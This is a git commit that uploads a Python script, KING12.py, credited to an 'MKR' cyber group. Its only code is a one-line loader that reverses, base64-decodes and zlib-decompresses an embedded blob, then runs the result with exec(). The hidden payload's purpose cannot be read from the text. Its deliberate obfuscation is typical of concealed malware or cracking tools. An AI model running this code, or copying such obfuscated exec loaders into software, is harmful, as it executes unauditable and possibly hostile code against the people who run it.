466d8d038e37471910bb1d4dd913ce9a74d663bd
Khairy-Salah <123173618+Khairy-9@users.noreply.github.com>
2023-10-25 20:20:52 +0200

    Add files via upload

---
+++ KING12.py
@@ -0,0 +1,7 @@
+# ══════════════════════
+# -*- coding:utf8 -*-
+# Encrypte by MKR 
+# https://github.com/Mkr404-Cyber
+# Author : OFLINE 
+# ══════════════════════
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'ACHhjtA+0os73SV8CsMY+Lts2OG7pNbBhuJcIECwiwBfEUknYbyCmh97SwM6xB3JNN61d+k99wDknLwibLDFyQhXigCT5gC7H3TiuHyxtMtFx4RFxNinQv86P/AiMxoT7Xbew83tmiJI/df0ZKIY7fmd6zhagQYss3n3MNhACTypOwN6U7+RonU08o1929ylQOeBywV96wBFe3TU3MbeZzTGSihABJhhR7s4io8QEbpIQWskJARw/CaoUeqpUXEY9NViip///96LvncdzlPuIco4nX+CxNl87aZFCdHvTFfeoMnjTwnV5lFleBlZelXQeuVc7JOg8aq4CCgZldhOqPRjQPaxH1NT2L9Ad/e2yuJrWbbtrxkjyhu6VtRTxnLKT3UT7v5V+GYOvyFmaFuBGfv7uTY1NZtSqX2MRSGunNarZIn/+iwbgu2GOVSSnqVzsYFXmVmsGXvKTlDFXiSdJUH6Xl5ZTFzlSWmrEMps6bg3XZiDT2otXUlIu6rSPYut1G4L+nMuRdVNODZdzL0l3IevZAHzMagFSHE/LJD0tglgs1oTouWieTnVWXXkUR4f3Ufczs0FSlspIZrkJJpqd933lBIF4lN69jf8Nfo39uX9QCOmtaUUEcM0KVpwBTUQEeEEwJJN6PTfZ45MjFjNLVSdc3GUPS7CN3ni+UoCCBVIbJJ3U6jsXK6ANmTuySWl/RsRt7FO9G6SSrBEkaZ7IonUeZZWaPc3QWqhpsvvQAD3q1cVNyJe'))
